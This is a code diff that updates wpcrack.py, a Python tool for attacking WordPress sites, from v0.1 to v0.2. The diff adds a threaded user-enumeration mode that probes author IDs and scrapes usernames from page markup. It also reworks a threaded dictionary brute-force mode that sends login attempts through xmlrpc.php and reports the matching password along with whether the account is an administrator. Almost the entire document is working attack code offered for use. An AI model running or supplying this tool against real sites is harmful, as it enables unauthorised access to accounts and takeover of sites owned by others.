@@ -3,7 +3,7 @@
 """
  Name: wpcrack.py
  Date: 21/09/2014
- Version: v0.1
+ Version: v0.2
 
  Summary
 
@@ -24,20 +24,40 @@ import requests
 import threading
 from os import _exit
 from lxml import etree
+from bs4 import BeautifulSoup
 
 LOCK = threading.Semaphore(value=1)
 
 def send_post_request(url, data):
     """ Function that sends a post request and returns the response content """
 
+    #proxies = {'http': 'http://localhost:8080', }
+    headers = {'Content-Type':'application/x-www-form-urlencoded'}
+
     try:
-        req = requests.post(url, data, timeout = 5)
+        req = requests.post(url, data, timeout=5,
+            headers=headers)
     except requests.exceptions.RequestException as retexception:
         LOCK.acquire()
         print "[Error] " + str(retexception)
         _exit(1)
 
-    return unicode(req.text).encode('utf-8')
+    return (req.status_code, unicode(req.text).encode('utf-8'))
+
+
+def send_get_request(url):
+    """ Function documentation """
+
+    #proxies = {'http': 'http://localhost:8080', }
+
+    try:
+        req = requests.get(url, timeout=5)
+    except requests.exceptions.RequestException as retexception:
+        LOCK.acquire()
+        print "[Error] " + str(retexception)
+        _exit(1)
+
+    return (req.status_code, unicode(req.text).encode('utf-8'))
 
 
 def build_xml_data(username, password):
@@ -55,7 +75,7 @@ def build_xml_data(username, password):
     return data
 
 
-def parse_post_response(response):
+def parse_pass_response(response):
     """ Function that analyzes the xml server response """
 
     tree = etree.fromstring(response)
@@ -70,12 +90,13 @@ def parse_post_response(response):
     return None
 
 
-def do_brute_force(url, username, password, quiet):
+def test_user_password(url, username, password, quiet):
     """ Function that launchs the actions to brute forcing the target """
 
     data = build_xml_data(username, password)
-    response = send_post_request(url, data)
-    result = parse_post_response(response)
+    (status,response) = send_post_request(url, data)
+
+    result = parse_pass_response(response)
     if result:
         LOCK.acquire()
         print "\n[+] Username: %s" % username
@@ -90,32 +111,75 @@ def do_brute_force(url, username, password, quiet):
             LOCK.release()
 
 
-def main(args):
-    """ Main function """
-
-    url = args.url + "/xmlrpc.php"
-    try:
-        resp = requests.get(url, timeout = 5)
-    except requests.exceptions.RequestException as retexception:
-        print "[Error] " + str(retexception)
-        exit(1)
-
-    if requests.codes.ok != resp.status_code:
-        print "[Error] The xmlrpc.php script is not found"
-        exit(1)
+def do_brute_force(args):
+    """ Function documentation """
 
     try:
-        wordlist = open(args.wordlist)
+        hnd = open(args.wordlist)
     except IOError as reterror:
         print str(reterror).encode('utf8')
         exit(1)
 
-    for line in wordlist.readlines():
+    for line in hnd.readlines():
         password = line.strip('\n')
         threading.Thread(
-            target = do_brute_force,
-            args = (url, args.username, password, args.quiet)
+            target = test_user_password,
+            args = (args.url, args.user, password, args.quiet)
         ).start()
+
+
+def parse_user_response(status, response):
+    """ Function documentation """
+
+    soup = BeautifulSoup(response)
+    if ((status >= 200) and (status < 400)):
+        user = soup.body['class'][2][len('author-'):]
+        return True, user
+    else:
+        return False,
+
+def test_user_exist(url, httpmethod, uid, verbose):
+    """ Function documentation """
+
+    if httpmethod == "GET":
+        url = url + "/?author=%d" % uid
+        (status, response) = send_get_request(url)
+    else:
+        (status, response) = send_post_request(url, "author=%d" % uid)
+
+    result = parse_user_response(status, response)
+    if result[0]:
+        LOCK.acquire()
+        print "[+] User found (uid: %d): %s" % (uid, result[1])
+        LOCK.release()
+    else:
+        if not verbose:
+            LOCK.acquire()
+            print "[-] User id %d not found" % uid
+            LOCK.release()
+
+
+def do_user_enumeration(args):
+    """ Function documentation """
+
+    for uid in range(1, args.num + 1):
+        threading.Thread(
+            target = test_user_exist,
+            args = (args.url, args.method, uid, args.quiet)
+        ).start()
+
+
+def main(args):
+    """ Main function """
+
+    if 'num' in vars(args).keys():
+        do_user_enumeration(args)
+    else:
+        args.url = args.url + "/xmlrpc.php"
+        if send_get_request(args.url)[0] != 200:
+            print "[Error] The xmlrpc.php script is not found"
+            exit(1)
+        do_brute_force(args)
 
 
 if __name__ == "__main__":
@@ -129,24 +193,46 @@ if __name__ == "__main__":
                        "Additionally, if the guessed password belongs"
                        " to a user with the administrator role that"
                        " will be also show.",
-        epilog = "Copyright (c) 2014 SEINHE, http://www.seinhe.com",
+        epilog = "Copyright (c) 2014 - neofito & SEINHE, http://www.seinhe.com",
         add_help =True,
-        version = '%(prog)s v0.1'
-        )
+        version = '%(prog)s v0.2'
+    )
 
-    ARGVPARSER.add_argument('url', action='store',
-        help="The url for the wordpress site")
+    GROUP = ARGVPARSER.add_argument_group('common arguments')
 
-    ARGVPARSER.add_argument('wordlist', action='store',
-        help="The dictionary file of passwords")
+    GROUP.add_argument('-u', '--url',
+        action='store', required=True,
+        help='The url for the wordpress site')
 
-    ARGVPARSER.add_argument('-u', dest='username', default='admin',
-        help='wordpress username (admin, by default)')
+    GROUP.add_argument('-q', '--quiet',
+        action='store_true', dest='quiet', default=False,
+        help='don\'t show you incorrect test results')
 
-    ARGVPARSER.add_argument('-q', action='store_true', dest='quiet',
-        default=False,
-        help='don\'t show passwords that doesn\'t match')
+    SUBPARSER = ARGVPARSER.add_subparsers()
+
+    ENUMERATE = SUBPARSER.add_parser('enumerate',
+        help='enumerate the wordpress user\'s')
+
+    ENUMERATE.add_argument('-n', '--num',
+        dest='num', type=int, default=10,
+        help='max value to the wordpress user id, 10 by default')
+
+    ENUMERATE.add_argument('-m', '--http-verb',
+        dest='method', choices=['GET', 'POST'], default='GET',
+        help='http verb used to make the requests, GET by default')
+
+    BRUTEFORCE = SUBPARSER.add_parser('bruteforce',
+        help='bruteforce the wordpress user passwords\'')
+
+    BRUTEFORCE.add_argument('-u', '--user',
+        dest='user', default='admin',
+        help='wordpress username, admin by default')
+
+    BRUTEFORCE.add_argument('-w', '--wordlist',
+        dest='wordlist', required=True,
+        help="the dictionary file of passwords")
 
     ARGS = ARGVPARSER.parse_args()
 
     main(ARGS)
+
